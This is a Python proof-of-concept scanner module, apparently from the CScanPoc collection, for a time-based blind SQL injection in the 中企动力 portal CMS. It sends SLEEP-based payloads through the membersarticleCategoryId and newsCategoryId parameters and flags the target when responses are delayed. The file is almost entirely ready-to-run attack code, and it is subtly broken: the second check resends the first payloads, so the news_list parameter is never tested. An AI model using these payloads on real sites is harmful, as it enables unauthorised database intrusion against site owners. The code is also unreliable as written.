# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time

class Vuln(ABVuln):
    vuln_id = 'ZhongqidongliCMS_0000' # 平台漏洞编号，留空
    name = '中企动力门户CMS SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-10-10'  # 漏洞公布时间
    desc = '''
        中企动力门户 CMS SQL注入漏洞，根据中企动力官网介绍，影响大约几十万的用户，有不少的大企业用户，影响很是广泛。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '中企动力门户CMS'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'ef09fe95-9378-4a17-ac65-2930b8444141'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer: http://www.wooyun.org/bugs/wooyun-2015-0145311
            hh = hackhttp.hackhttp()
            payload1_0 = "/membersarticle_list/&membersarticleCategoryId=1' AND (SELECT * FROM (SELECT(SLEEP(0)))qoxp) AND 'KGia'='KGia.html"
            payload1_5 = "/membersarticle_list/&membersarticleCategoryId=1' AND (SELECT * FROM (SELECT(SLEEP(5)))qoxp) AND 'KGia'='KGia.html"
            time1_0 = time.time()
            code0, head, res, errcode, _ = hh.http(self.target + payload1_0)
            time1_end_0 = time.time() - time1_0
            time1_5 = time.time()
            code5, head, res, errcode, _ = hh.http(self.target + payload1_5)
            time1_end_5= time.time() - time1_5
            if code0 == 200 and code5 == 200 and time1_end_5 - time1_end_0 > 4.5:
                #security_hole(arg+payload1_5+ ' sql injection!')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))


            payload2_0 = "/news_list/&newsCategoryId=6' AND (SELECT * FROM (SELECT(SLEEP(0)))qoxp) AND 'KGia'='KGia.html"
            payload2_5 = "/news_list/&newsCategoryId=6' AND (SELECT * FROM (SELECT(SLEEP(5)))qoxp) AND 'KGia'='KGia.html"

            time2_0 = time.time()
            code0, head, res, errcode, _ = hh.http(self.target + payload1_0)
            time2_end_0 = time.time() - time2_0
            time2_5 = time.time()
            code5, head, res, errcode, _ = hh.http(self.target + payload1_5)
            time2_end_5 = time.time() - time2_5
            if code0 == 200 and code5 == 200 and time2_end_5 - time2_end_0 > 4.5:
                #security_hole(arg+payload2_5+ ' sql injection!')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
